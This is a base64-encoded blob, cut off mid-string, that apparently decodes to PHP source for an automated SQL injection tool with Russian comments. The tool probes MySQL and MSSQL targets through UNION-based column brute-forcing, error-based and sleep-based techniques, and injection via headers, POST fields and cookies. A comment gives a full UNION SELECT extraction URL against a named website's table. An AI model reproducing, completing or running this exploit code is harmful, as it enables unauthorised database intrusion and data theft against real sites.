JCX0KCQkJCgkJCWlmKGludHZhbCgkZGF0YVsncG9zdHMnXVsnc3Bvc29iJ10pPT0yKXsKCQkJCSR0aGlzLT5nZXRfYnlfZXJyb3I9JyUyMic7CgkJCX0KCQkJCQoJCQkJCgkJCQkKCQkJCSR3ID0gZXhwbG9kZSgnLCcsICRkYXRhWydwb3N0cyddWyd3b3JrJ10pOwoJCQkJCgkJCQlpZigkdyE9PScnKQoJCQkJewoJCQkJCgkJCQkJZm9yZWFjaCAoJHcgYXMgJHYpCgkJCQkJewoJCQkJCQlpZihpbnR2YWwoJHYpIT09MCkkdGhpcy0+d29ya1tdID0gJHY7CgkJCQkJfQoJCQkJfQoJCQkJCgkJCQkkdGhpcy0+Y29sdW1uICA9ICRkYXRhWydwb3N0cyddWydjb2x1bW4nXSA7CgkJCQkkdGhpcy0+dmVyc2lvbiA9ICRkYXRhWydwb3N0cyddWyd2ZXJzaW9uJ10gOwoJCQkKCQkJaWYoJHNldCAhPT1mYWxzZSApCgkJCXsKCQkJCQoJCQkJJHNldCA9IHVuc2VyaWFsaXplKCRzZXQpOwoJCQkJCgkJCQkvLyR0aGlzLT5kKCRzZXQsJ2luamVjdCAkc2V0ICE9PWZhbHNlIGluamVjdCcpOwoJCQkJCgkJCQkKCQkJCQoJCQkJJHRoaXMtPnNldCA9ICR0aGlzLT5wYXJzZV9saW5rKCdodHRwOi8vJy4kdGhpcy0+dXJsKTsKCQkJCQoJCQkJaWYoJHRoaXMtPmh0dHBzKXsKCQkJCQkkdGhpcy0+c2V0WyJzY2hlbWUiXSA9ICdodHRwcyc7CgkJCQl9ZWxzZXsKCQkJCQkkdGhpcy0+c2V0WyJzY2hlbWUiXSA9ICdodHRwJzsKCQkJCX0KCQkJCQoJCQkJJHRoaXMtPnNlYz0zOwoJCQkJJHRoaXMtPnNldFsnZnVsbCddID0gJHRoaXMtPnNldFsnc2NoZW1lJ10uJzovLycuJHRoaXMtPnNldFsnaG9zdCddLiR0aGlzLT5zZXRbJ3BhdGgnXS4nPyc7CgkJCQkKCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWyd0cCddPSRzZXRbJ3RwJ107IAoJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3F0J109JHNldFsncXQnXTsKCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcCddPSRzZXRbJ3NwJ107CgkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT0kc2V0WydlZCddOwoJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ109JHNldFsnYW4nXTsKCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydubCddPSRzZXRbJ25sJ107CgkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3EnXT0kc2V0WydzcSddOwoJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NsJ109JHNldFsnc2wnXTsKCQkJCQoJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnc2NiJ109ICRzZXRbJ3NjYiddOwoJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J109ICRzZXRbJ2NvbWVudCddOwoJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnb3V0cCddPSAkc2V0WydvdXRwJ107CgkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydoZXgnXT0gJHNldFsnaGV4J107CgkJCQkkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSA9ICRzZXRbJ2tleSddOwoJCQkJJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10gPSAkc2V0Wyd2YWwnXTsKCQkJCQoKCQkJCSR0aGlzLT5zbGVlcF9tZXRvZCA9IHRydWU7CgkJCQoJCQl9CgkJCgkJCQoJCX1lbHNlewoJCQkKCQkJIyRpbmpfdGVzdCA9ICR0aGlzLT5pbmpfdGVzdCgkdGhpcy0+dXJsKTsKCQkJLy8kdGhpcy0+ZCgkaW5qX3Rlc3QsJyRpbmpfdGVzdCBTTEVFUCcpOwoJCQkvL2lmKCRpbmpfdGVzdD09J3NsZWVwX21ldG9kJyl7JHg9MTt9ZWxzZXskeD0wO30KCQkJCgkJCQoJCQlpZigkdGhpcy0+c3RhcnQoKSA9PSB0cnVlKQoJCQl7CgkJCQkJCgkJCQlpZigkdGhpcy0+bXNzcWw9PXRydWUpCgkJCQl7CgkJCQkJCgkJCQkJJHRoaXMtPm1zc3FsR2V0VmVyc2lvbigpOwoJCQkJCQoJCQkJCSR2ID0gc3Vic3RyKCR0aGlzLT52ZXJzaW9uLCAwLDEpOwoJCQkJCQoJCQkJCWlmKCR2PT0nTScgb3IgJHY9PSdtJykKCQkJCQl7CgkJCQkJCXJldHVybiB0cnVlOwoJCQkJCX1lbHNlewoJCQkJCQkKCQkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJCX0KCQkJCQkKCQkJCQkJCgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJaWYoJHRoaXMtPnZlcnNpb24gIT0nJykKCQkJCQl7CgkJCQkJCXJldHVybiB0cnVlOwoJCQkJCX0KCQkJCQkKCQkJCQkKCQkJCQkkdGhpcy0+bXlzcWxHZXRWZXJzaW9uKCk7CgkJCQkJCgkJCQkJaWYoJHRoaXMtPnZlcnNpb24gIT0nJykKCQkJCQl7CgkJCQkJCXJldHVybiB0cnVlOwoJCQkJCX0KCQkJCX0KCQkJCQkKCQkJCQoJCQkJcmV0dXJuIGZhbHNlOwoJCQkJCgkJCQkKCQkJfWVsc2UKCQkJewoJCQkJcmV0dXJuIGZhbHNlOwoJCQl9CgkJCQoJCX0KCQkKCX0JCgkJCglmdW5jdGlvbiBoZWFkX2luamVjdCgkdXJsLCRocywkZGF0YT1mYWxzZSwkc2V0PWZhbHNlLCRwb3N0PWZhbHNlKXsvL9Cy0YvRgdGC0YPQv9Cw0LXRgiDQutCw0Log0L/RgNC10LTQvtCx0L7Qu9C+0YfQutCwINGC0LDQuiDQuCDRgdCw0LzQvtGB0YLQvtGP0YLQtdC70YzQvdCw0Y8g0YTRg9C90LrRhtC40Y8KCQoJCSR0aGlzLT5odHRwc19jaGVjaz1mYWxzZTsKCQkkdGhpcy0+Y2hlY2tfaHR0cHMoJHVybCwkaHMpOwoJCgkJJGhlYWQgPSAkaHNbJ2luamVjdCddOwoKCQlpZigkaHNbJ3VybCddICE9JycpJHVybCA9ICRoc1sndXJsJ107CgkJJHVybCA9ICR0aGlzLT5maWx0ZXJfdXJsKCR1cmwpOwoJCQoJCQoJCQoJCQoJCQoJCSR0bXAgPSBwYXJzZV91cmwoJHVybCk7CgkJJHVybCA9JHRtcFsncGF0aCddOyAKCQkvLyR0aGlzLT5kKCR0bXAsJ3RtcCBpbmplY3QnKTsKCQkKCQkKCQkKCQlpZigkaGVhZCA9PSAndXNlcmFnZW50Jyl7CgkJCSR0aGlzLT5tZXRob2Rfb2xkID10cnVlOwoJCQkkdGhpcy0+aF9zWyd1c2VyYWdlbnQnXSA9ICdtb3ppbGxhJzsKCQl9ZWxzZWlmKCRoZWFkID09ICdyZWZlcmVyJyl7CgkJCSR0aGlzLT5tZXRob2Rfb2xkID10cnVlOwoJCQkkdGhpcy0+aF9zWydyZWZlcmVyJ10gPSAgICdnb29nbGUuY29tJzsKCQl9ZWxzZWlmKCRoZWFkID09ICdmb3J3YXJkZXInKXsKCQkJJHRoaXMtPm1ldGhvZF9vbGQgPXRydWU7CgkJCSR0aGlzLT5oX3NbJ2ZvcndhcmRlciddID0gJzguOC44LjgnOwoJCX1lbHNlaWYoJGhlYWQgPT0gJ3Bvc3QnKXsKCQkJJHRoaXMtPmhfc1sncG9zdCddID0gICAgICAkaHNbJ3Bvc3QnXTsKCQl9ZWxzZWlmKCRoZWFkID09ICdjb29raWVzJyl7CgkJCWlmKCRoc1snY29va2llcyddICE9JycpewoJCQkJJHRoaXMtPmhfc1snY29va2llcyddID0gICAkaHNbJ2Nvb2tpZXMnXTsKCQkJfWVsc2V7CgkJCQkkdGhpcy0+aF9zWydjb29raWVzJ10gPSAgICR0aGlzLT5oX3NbJ2Nvb2tpZXMnXTsKCQkJfQoJCQkKCQl9CgkJCgkJLy8kdGhpcy0+aGVhZGVyID0gdHJ1ZTsKCQkkdGhpcy0+aGVhZF9lbmFibGUgPSB0cnVlOwoJCQoJCSR0aGlzLT5oX3NbJ3Bvc3Rfc3RhdGljJ10gPSAgJGhzWydwb3N0X3N0YXRpYyddOwoJCQoJCSR0aGlzLT5oX3NbJ2luamVjdCddID0gJGhlYWQ7CgkJCgkJJHRoaXMtPmhfc1sndXJsJ10gPSAgJHVybDsKCQkKCQkvLyR0aGlzLT5kKCR0aGlzLT5oX3MsJyR0aGlzLT5oX3MnKTsKCQkvL2V4aXQ7CgkJCgkJJHRlc3QgPSAkdGhpcy0+Z2V0X2luamVjdCgkdXJsLiI/Ii4kdGhpcy0+aF9zWyRoZWFkXSwkZGF0YSwkc2V0LCRwb3N0KTsKCQkKCQkKCQkKCQlpZigkdGVzdCA9PSBUUlVFKXsKCQkJcmV0dXJuICRoZWFkOwkKCQl9ZWxzZXsKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQkKCX0KCQoJCgkKCQoJCgkKCWZ1bmN0aW9uIHN0YXJ0KCl7Ly/RgdGC0LDRgNGC0L7QstCw0Y8g0YTRg9C90LrRhtC40Y8g0LTQu9GPINC30LDQv9GD0YHQutCwIDQg0YHQv9C+0YHQvtCx0L7QsgoJCQkKCQkJJHRoaXMtPmQoJ3N0YXJ0IG5hY2hhbG8hISEnKTsKCQkJCgkJCQoJCQlpZigkdGhpcy0+bXNzcWw9PXRydWUpCgkJCXsKCQkJCQoJCQkJCgkJCQlpZigkdGhpcy0+bXNzcWxPcmRlckVycm9yKCk9PXRydWUpewoJCQkJCQoJCQkJCSR0aGlzLT5kKCJNU1NRTCBHT09EIG1zc3FsT3JkZXJFcnJvciIpOwoJCQkJCQoJCQkJCS8vZXhpdDsKCQkJCQkKCQkJCQlyZXR1cm4gVFJVRTsKCQkJCX1lbHNlewoJCQkJCSR0aGlzLT5kKCJNU1NRTCBCQUQgbXNzcWxPcmRlckVycm9yIik7CgkJCQl9CgkJCQkKCQkJCS8vcmV0dXJuIEZBTFNFOwoJCQkJCgkJCQkKCQkJCQoJCQkJaWYoJHRoaXMtPm1zc3FsTW92ZVBlcmVib3IoKT09dHJ1ZSkKCQkJCXsKCQkJCQoJCQkJCgkJCQkJJHRoaXMtPmQoIk1TU1FMIEdPT0QgUEVSRUJPUiIpOwoJCQkJCS8vJHRoaXMtPmQoJHRoaXMtPnNwb3NvYiwndGhpcy0+c3Bvc29iJyk7CgkJCQkJLy8kdGhpcy0+ZCgkdGhpcy0+bWV0aG9kLCd0aGlzLT5tZXRob2QnKTsKCQkJCQkKCQkJCQkKCQkJCQlyZXR1cm4gVFJVRTsKCQkJCX1lbHNlCgkJCQl7CgkJCQkJJHRoaXMtPmQoJ2ZhbHNlIGluamVjdCBNU1NRTE1vdmVQZXJlYm9yJyk7CgkJCQkJJHRoaXMtPmQoJ2VzbGkgMTAwJSBNU1NRTCB0byBuZSBjaGVja2FlbSBkYWxzaGUnKTsKCQkJCQkvL3JldHVybiBmYWxzZTsKCQkJCX0KCQkJCQoJCQkJcmV0dXJuIGZhbHNlOwoJCQkJCgkJCQkKCQkJfQoJCQkKCQkJJHRoaXMtPm1zc3FsPWZhbHNlOwoJCQoJCQkKCQoJCQkKCQkJaWYoJHRoaXMtPnR5cGVfc3Bvc29iX3VuaW9uPT10cnVlKXsKCQkJCgkJCQlpZigkdGhpcy0+bXlzcWxNb3ZlUGVyZWJvcigpPT10cnVlKXsKCQkJCQkkdGhpcy0+ZCgnbXlzcWxNb3ZlUGVyZWJvciBZRVMgdGVwZXIgcHJvdmVya2EgdmVyc2lvbicpOwoJCQkJCS8vJHRoaXMtPmQoJHRoaXMtPnNwb3NvYiwndGhpcy0+c3Bvc29iJyk7CgkJCQkJLy8kdGhpcy0+ZCgkdGhpcy0+bWV0aG9kLCd0aGlzLT5tZXRob2QnKTsKCQkJCQkKCQkJCQoJCQkJCSR0aGlzLT5teXNxbEdldFZlcnNpb24oKTsKCQkJCQoJCQkJCSR0aGlzLT5kKCR0aGlzLT52ZXJzaW9uLCckdGhpcy0+dmVyc2lvbicpOwoJCQkJCWlmKCR0aGlzLT52ZXJzaW9uID09JycpCgkJCQkJewkKCQkJCQkJJHRoaXMtPmQoJ215c3FsTW92ZVBlcmVib3IgWUVTLCBubyB2ZXJzaW9uIE5PT09PTyAtPj4nKTsKCQkJCQl9ZWxzZQoJCQkJCXsJCgkJCQkJCXJldHVybiB0cnVlOwoJCQkJCX0KCQkJCQoJCQkJfWVsc2V7CgkJCQkJJHRoaXMtPmQoJ2ZhbHNlIGluamVjdCBteXNxbE1vdmVQZXJlYm9yJyk7CgkJCQl9CgkJCX0KCQkJCgkJCS8vcmV0dXJuIGZhbHNlOwoJCQkKCQkJCgkJCQoJCQlpZigkdGhpcy0+dHlwZV9zcG9zb2Jfc2xlZXA9PXRydWUpewoJCQkKCQkJCWlmKCR0aGlzLT5zcWxpKCkgPT0gdHJ1ZSkKCQkJCXsKCQkJCQkJJHRoaXMtPmQoJ3NsZWVwX21ldGhvZCBZRVMnKTsKCQkJCQkJJHRoaXMtPmQoJHRoaXMtPm1ldGhvZCwndGhpcy0+bWV0aG9kJyk7CgkJCQkJCSR0aGlzLT5kKCR0aGlzLT5zcG9zb2IsJ3RoaXMtPnNwb3NvYicpOwoJCQkJCQkKCQkJCQkJJHRoaXMtPm15c3FsR2V0VmVyc2lvbigpOwoJCQkJCQkKCQkJCQkJCgkJCQkJCQoJCQkJCQlpZigkdGhpcy0+dmVyc2lvbiA9PScnKQoJCQkJCQl7CQoJCQkJCQkJJHRoaXMtPmQoJ1NMRUVQIElOSkVDVElPTiBZRVMsIG5vIHZlcnNpb24gTk9PT09PIC0+PicpOwoJCQkJCQl9ZWxzZQoJCQkJCQl7CQoJCQkJCQkJJHRoaXMtPnNsZWVwX21ldG9kID0gdHJ1ZTsKCQkJCQkJCXJldHVybiB0cnVlOwoJCQkJCQl9CgkJCQkJCQoJCQkJCQlyZXR1cm4gdHJ1ZTsKCQkJCX1lbHNlewoJCQkJCgkJCQkJJHRoaXMtPmQoJ2ZhbHNlIGluamVjdCBzbGVlcCBtZXRob2QnKTsKCQkJCQkkdGhpcy0+c2xlZXBfbWV0b2QgPSBmYWxzZTsKCQkJCQkKCQkJCX0KCQkJfQoJCQoKCQoJCQoJCQlpZigkdGhpcy0+aGVhZF9lbmFibGU9PXRydWUpe3JldHVybiBmYWxzZTt9CgkJCWlmKCR0aGlzLT5tc3NxbD09dHJ1ZSl7cmV0dXJuIGZhbHNlO30KCgkJCQoJCQoJCQkKCQkJCgkJCQoJCQkKCQkJCgkJCQkKCQkJaWYoJHRoaXMtPm15c3FsRmluZEVycm9yU3FsTmV3KCk9PXRydWUpewoJCQkJCSR0aGlzLT5kKCdteXNxbEZpbmRFcnJvclNxbE5ldyBZRVMnKTsKCQkJCQkKCQkJCQkkdGhpcy0+bXlzcWxHZXRWZXJzaW9uKCk7CgkJCQkJCgkJCQkJaWYoJHRoaXMtPnZlcnNpb24gPT0nJykKCQkJCQl7CQoJCQkJCQkkdGhpcy0+ZCgnbXlzcWxGaW5kRXJyb3JTcWxOZXcgWUVTLCBubyB2ZXJzaW9uIE5PT09PTycpOwoJCQkJCX1lbHNlCgkJCQkJewkKCQkJCQkJcmV0dXJuIFRSVUU7CgkJCQkJfQoJCQkJCQoJCQkJCXJldHVybiB0cnVlOwkKCQkJfWVsc2V7CgkJCQkkdGhpcy0+ZCgnZmFsc2UgaW5qZWN0IG15c3FsRmluZEVycm9yU3FsTmV3LS0tJyk7CgkJCX0KCQkJCgkJCWlmKCR0aGlzLT5teXNxbEZpbmRFcnJvclNxbCgpPT10cnVlKXsKCQkJCQkkdGhpcy0+ZCgnbXlzcWxGaW5kRXJyb3JTcWwgWUVTJyk7CgkJCQkJCgkJCQkJJHRoaXMtPm15c3FsR2V0VmVyc2lvbigpOwoJCQkJCgkJCQkJCgkJCQkJaWYoJHRoaXMtPnZlcnNpb24gPT0nJykKCQkJCQl7CQoJCQkJCQkkdGhpcy0+ZCgnbXlzcWxGaW5kRXJyb3JTcWwgWUVTLCBubyB2ZXJzaW9uIE5PT09PTycpOwoJCQkJCQlyZXR1cm4gZmFsc2U7CgkJCQkJfWVsc2UKCQkJCQl7CQoJCQkJCQlyZXR1cm4gVFJVRTsKCQkJCQl9CgkJCQkJCgkJCQkJCgkJCX1lbHNlewoJCQkJJHRoaXMtPmQoJ2ZhbHNlIGluamVjdCBteXNxbEZpbmRFcnJvclNxbC0tLScpOwoJCQl9CgkJCQoJCQkvKioKCQkJaWYoJHRoaXMtPm15c3FsT3JkZXJFcnJvcigpPT10cnVlKXsKCQkJCQkkdGhpcy0+ZCgnbXlzcWxPcmRlckVycm9yIFlFUycpOwoJCQkJCQoJCQkJCSR0aGlzLT5teXNxbEdldFZlcnNpb24oKTsKCQkJCQoJCQkJCQoJCQkJCWlmKCR0aGlzLT52ZXJzaW9uID09JycpCgkJCQkJewkKCQkJCQkJJHRoaXMtPmQoJ215c3FsT3JkZXJFcnJvciBZRVMsIG5vIHZlcnNpb24gTk9PT09PJyk7CgkJCQkJfWVsc2UKCQkJCQl7CQoJCQkJCQlyZXR1cm4gVFJVRTsKCQkJCQl9CgkJCQkJCgkJCQkJCgkJCX1lbHNlewoJCQkJJHRoaXMtPmQoJ2ZhbHNlIGluamVjdCBteXNxbE9yZGVyRXJyb3ItLS0nKTsKCQkJfQoJCQkqKi8KCQkJCgkJCXJldHVybiBGQUxTRTsKCQkJCgkJCQoJCX0KCgkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAtLU1ZU1FMLS0gIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMJCgkJCglmdW5jdGlvbiBteXNxbE1vdmVQZXJlYm9yKCl7Ly9NWVNRTCDQv9C10YDQtdCx0L7RgCB2YXJpYW50X3F1ZXJ5OyBzcG9zb2IgMSDQuCDQvNC10YLQvtC0INC00L4gMiBVTklPTiBjINC+0YjQuNCx0LrQvtC5CgkJCQoJCQkkdGhpcy0+ZCgnbXlzcWxNb3ZlUGVyZWJvciBuYWNoYWxvJyk7CgkJCQoJCQkkc3Bvc29iID0gJHRoaXMtPnZhcmlhbnRfcXVlcnk7Ly8g0YHQv9C40YHQvtC6IHF1ZXJ5INC30LDQv9GA0L7RgdC+0LIg0LTQu9GPINC/0LXRgNC10LHQvtGA0LAKCQkJCgkJCgkJCSRzcG9zID0gMTsvL9GC0YPRgiDRgdC+0LTQtdGA0LbQuNGC0YHRjyDQvNCw0YHRgdC40LIg0LfQsNC/0YDQvtGB0L7QsgoJCQkKCQkJZm9yZWFjaCAoJHNwb3NvYiBhcyAkcXVlcnllcykvL9CyICRxdWVyeWVzINC80LDRgdGB0LjQsiDQuNC3IDMg0LzQsNGB0YHQuNCy0L7QsgoJCQl7CgkJCQkJCQkJCgkJCQkkbWV0aG9kPTA7Ly/RjdGC0L4g0Log0L/RgNC40LzQtdGA0YMg0Y3RgtC+0YIgMTExMTExMTExMTExMStVTklPTitTRUxFQ1QrINC80LXRgtC+0LQKCQkJCQoJCQkJLy8kdGhpcy0+ZCgkcXVlcnllcywnJHF1ZXJ5ZXMnKTsKCQkJCQoJCQkJZm9yZWFjaCAoJHF1ZXJ5ZXMgYXMgJHZhbHVlKS8v0LIgJHZhbHVlIGFycmF5KCcxMTExMTExMTExMTExK1VOSU9OK1NFTEVDVCsnLCcrLS0rJyksIAoJCQkJewoJCQkJCQoKCQkJCQkKCQkJCQkkcmVzdWx0ID0gJHRoaXMtPmdldFNwb3NvYigkdmFsdWUpOwkKCQkJCQkKCQkJCQlpZigkdGhpcy0+Y29udGVudF9lbXB0eSA9PTEpewoJCQkJCQlyZXR1cm4gZmFsc2U7CgkJCQkJfQoJCQkJCQoJCQkJCWlmKCRyZXN1bHQhPT1mYWxzZSkKCQkJCQl7CgkJCQkJCgkJCQkJCSR0aGlzLT5tZXRob2QgPSAkbWV0aG9kOwoKCQkJCQkJJHRoaXMtPnNwb3NvYiA9ICRzcG9zOy8vINC/0L7Qu9GD0YfQsNC10YLRgdGPINGC0YPRgiDQstGB0LXQs9C00LAg0L/QtdGA0LLRi9C8INCx0YPQtNC10YIKCQkJCQkJCgkJCQkJCXJldHVybiB0cnVlOwkJCQkKCQkJCQoJCQkJCX0KCQkJCQoJCQkJCSRtZXRob2QrKzsKCQkJCQkvL2V4aXQ7CgkJCQl9CgkJCQkkc3BvcysrOwoJCQl9CgkJCQoJCQkJCgkJCQkvLyR0aGlzLT5teXNxbEdldFZlcnNpb24oKTsKCQkJCS8vJHRoaXMtPmQoJHRoaXMtPnZlcnNpb24sJyR0aGlzLT52ZXJzaW9uJyk7CgkJCQkvL2V4aXQ7CgoJCQlyZXR1cm4gZmFsc2U7CgkJCQoJCQkKCQl9CgkJCglmdW5jdGlvbiBnZXRTcG9zb2IoJHF1ZXJ5X3F1ZXJ5KXsvLyDRgdC+0LfQtNCw0L3QuNC1IHVybCDRgSDQutC+0LvQvtC90LrQsNC8INC4INC/0L7QuNGB0Log0L3Rg9C20L3Ri9GFINCyINC+0YLQstC10YLQtSAvLy8vL9CU0J7Qp9CV0KDQndCv0K8g0KTQo9Cd0JrQptCY0K8g0LTQu9GPINC80LXRgtC+0LTQvtCyLy8vLy8vLwoJCQoJCQoJCQkJJHRoaXMtPmQoJHF1ZXJ5X3F1ZXJ5LCckcXVlcnlfcXVlcnknKTsKCQkJCQoJCQkJLy9leGl0OwoJCQkJZm9yICgkaT0xOyRpPD0kdGhpcy0+Y29sdW1uX2xpbWl0OyRpKyspLy/Qu9C40LzQuNGCIDI1INC/0L4g0LTQtdGE0L7Qu9GC0YMKCQkJCXsKCQkJCQoJCQkJCSRjb2wgPSAxOwoJCQkJCSRxdWVyeSA9ICRxdWVyeV9xdWVyeVswXTsKCQkJCQkKCQkJCQl3aGlsZSAoJGNvbDw9JGkpCgkJCQkJewoJCQkJCQkKCS8vaHR0cDovL2tpbm9rbHVibmljaGthLnJ1L25ld3Nfdmlldy5waHA/bmV3c19pZD0yIFVOSU9OIEFMTCBTRUxFQ1QgKFNFTEVDVCBDT05DQVQoJ3F2a3FxJyxJRk5VTEwoQ0FTVChBQ1RJVkUgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChBR0VOVF9JTlRFUlZBTCBBUyBDSEFSKSwnICcpLCdqemFycXQnLElGTlVMTChDQVNUKERBVEVfQ0hFQ0sgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChJRCBBUyBDSEFSKSwnICcpLCdqemFycXQnLElGTlVMTChDQVNUKElTX1BFUklPRCBBUyBDSEFSKSwnICcpLCdqemFycXQnLElGTlVMTChDQVNUKExBU1RfRVhFQyBBUyBDSEFSKSwnICcpLCdqemFycXQnLElGTlVMTChDQVNUKE1PRFVMRV9JRCBBUyBDSEFSKSwnICcpLCdqemFycXQnLElGTlVMTChDQVNUKE5BTUUgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChORVhUX0VYRUMgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChTT1JUIEFTIENIQVIpLCcgJyksJ2p6YXJxdCcsSUZOVUxMKENBU1QoVVNFUl9JRCBBUyBDSEFSKSwnICcpLCdxanp6cScpIEZST00gdTM1NDkxXzIuYl9hZ2VudCBMSU1JVCAyLDEpLS0gLQoJCQkJCQkKCQkJCQkJCQoJCQkJCQlpZigkY29sPT0xKXsKCQkJCQkJCSRxdWVyeSAuPSAnQ0hBUignLiR0aGlzLT5jaGFyY2hlcignLXgnLiRjb2wuJy1RLScpLicpJzsKCQkJCQkJCQoJCQkJCQkJLy8kcXVlcnkgLj0gJ0lGTlVMTChDQVNUKCcuJHRoaXMtPmNoYXJjaGVyKCcteCcuJGNvbC4nLVEtJykuJyBBUyBDSEFSKSknOwoJCQkJCQkJCgkJCQkJCX1lbHNlewoJCQkJCQkJCgkJCQkJCQkkcXVlcnkgLj0gJyxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCcteCcuJGNvbC4nLVEtJykuJyknOyAKCQkJCQkJCQoJCQkJCQkJLy8kcXVlcnkgLj0gJyxJRk5VTEwoQ0FTVCgnLiR0aGlzLT5jaGFyY2hlcignLXgnLiRjb2wuJy1RLScpLicgQVMgQ0hBUikpJzsKCQkJCQkJfQoJCQkJCQkJCgkJCQkJCQoJCQkJCQkKCQkJCQkJCgkJCQkJCSRjb2wrKzsKCQkJCQl9CgkJCQkKCQkJCQkKCQkJCQkkY29sdW1uWyRpXSA9ICR0aGlzLT51cmwuJHF1ZXJ5LiRxdWVyeV9xdWVyeVsxXTsKCQkJCQkJCgkJCQkJZmx1c2goKTsKCQkJCQkvLyRjb2x1bW5fcG9zdFskaV0gPSAkcXVlcnkuJHF1ZXJ5X3F1ZXJ5WzFdLicrLyonOwoJCQkJCQoJCQkJCS8vJHRoaXMtPmQoJHRoaXMtPnVybCwnJHRoaXMtPnVybCcpOwoJCQkJCQoJCQkJCQkJCQkKCQkJCX0KCQkJCQoJCQkvLwlleGl0OwoJCQkJCgkJCQkvL2lmKCR0aGlzLT5kZWJ1Zz09dHJ1ZSl7JHRoaXMtPmQoJGNvbHVtbiwnJGNvbHVtbicpO30KCQkJCgkJCQkKCQkJCQoJCQkJJGk9MTsKCQkJCQoJCQkJZm9yZWFjaCAoJGNvbHVtbiBhcyAka2V5PT4kdmFsdWUpCgkJCQl7CgkJCQkJCgkJCQkJLy8kdGhpcy0+Zm9ybV9zZXRbJ2Zvcm1fcG9zdF9xdWVyeSddID0gc3RyX3JlcGxhY2UoJHRoaXMtPnVybCwnJywkdmFsdWUpOwoJCQkJCSR0aGlzLT5mb3JtX3NldFsnZm9ybV9wb3N0X3F1ZXJ5J10gPSAkdmFsdWU7CgkJCQkJCgkJCQkJLy8kdGhpcy0+ZCgkdGhpcy0+Zm9ybV9zZXRbJ2Zvcm1fcG9zdF9xdWVyeSddLCdkYWQnKTsKCQkJCQkvL2V4aXQ7CgkJCQkJCgkJCQkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHZhbHVlKTsKCQkJCQkKCQkJCQkvL2lmKCR0aGlzLT5jb250ZW50X2VtcHR5ID09MSl7CgkJCQkJLy8JcmV0dXJuIGZhbHNlOwoJCQkJCS8vfQoJCQkJCQoJCQkJCWlmKCRmaWxlKQoJCQkJCWZsdXNoKCk7CgkJCQkJCgkJCQkJLy9leGl0OwoJCQkJCWlmKHN0cnN0cigkZmlsZSwgJy1RLScpKQoJCQkJCXsKCQkJCQkJaWYoJHRoaXMtPmRlYnVnPT10cnVlKXskdGhpcy0+ZCgka2V5LCckdmFsdWUnKTt9CgkJCQkJCQoJCQkJCQkkY29sdW1uWiA9ICRrZXk7CgkJCQkJCQoJCQkJCQkKCQkJCQkJYnJlYWs7CgkJCQkJCQoJCQkJCX0KCQkJCQkKCQkJCQkkaSsrOwoJCQkJCS8vaWYoJGk9PTEwKXtleGl0O30KCQkJCQkKCQkJCX0KCQkJCQoJCQkKCQkJCgkJCQlpZihpc3NldCgkY29sdW1uWikpCgkJCQl7CQoKCQkJCQkkdGhpcy0+ZCgkY29sdW1uWiwnJGNvbHVtblohISEhISEhISEhISEhIScpOwoJCQkJCgkJCQkJcHJlZ19tYXRjaF9hbGwoJ34teCguKj8pLVEtficsJGZpbGUsJGFycik7CgkJCQkJCgkJCQkJJHRoaXMtPmNvbHVtbiA9ICRjb2x1bW5aOwoJCQkJCSR0aGlzLT53b3JrICAgPSAkYXJyWzFdOwoJCQkJCQkKCQkJCQlyZXR1cm4gYXJyYXkoJGNvbHVtblosJGFyclsxXSk7CgkJCQl9ZWxzZXsKCQkJCQlyZXR1cm4gRkFMU0U7CgkJCQl9CgkJCgl9CgoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgKytNU1NRTCsrICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkKCWZ1bmN0aW9uIG1zc3FsTW92ZVBlcmVib3IoKXsvL01TU1FMINC/0LXRgNC10LHQvtGAIHZhcmlhbnRfcXVlcnlfbXNzcWw7IHNwb3NvYiAxINC4INC80LXRgtC+0LQg0LTQviAyIFVOSU9OIGMg0L7RiNC40LHQutC+0LkKCQkKCQkkdGhpcy0+ZCgnbXNzcWxNb3ZlUGVyZWJvciBuYWNoYWxvJyk7CgkJCgkJJHNwb3NvYiA9ICR0aGlzLT52YXJpYW50X3F1ZXJ5X21zc3FsOy8vINGB0L/QuNGB0L7QuiBxdWVyeSDQt9Cw0L/RgNC+0YHQvtCyINC00LvRjyDQv9C10YDQtdCx0L7RgNCwCgkJCgkKCQkkc3BvcyA9IDE7Ly/RgtGD0YIg0YHQvtC00LXRgNC20LjRgtGB0Y8g0LzQsNGB0YHQuNCyINC30LDQv9GA0L7RgdC+0LIKCQkKCQlmb3JlYWNoICgkc3Bvc29iIGFzICRxdWVyeWVzKS8v0LIgJHF1ZXJ5ZXMg0LzQsNGB0YHQuNCyINC40LcgMyDQvNCw0YHRgdC40LLQvtCyCgkJewoJCQkJCQkJCgkJCSRtZXRob2Q9MDsvL9GN0YLQviDQuiDQv9GA0LjQvNC10YDRgyDRjdGC0L7RgiAxMTExMTExMTExMTExK1VOSU9OK1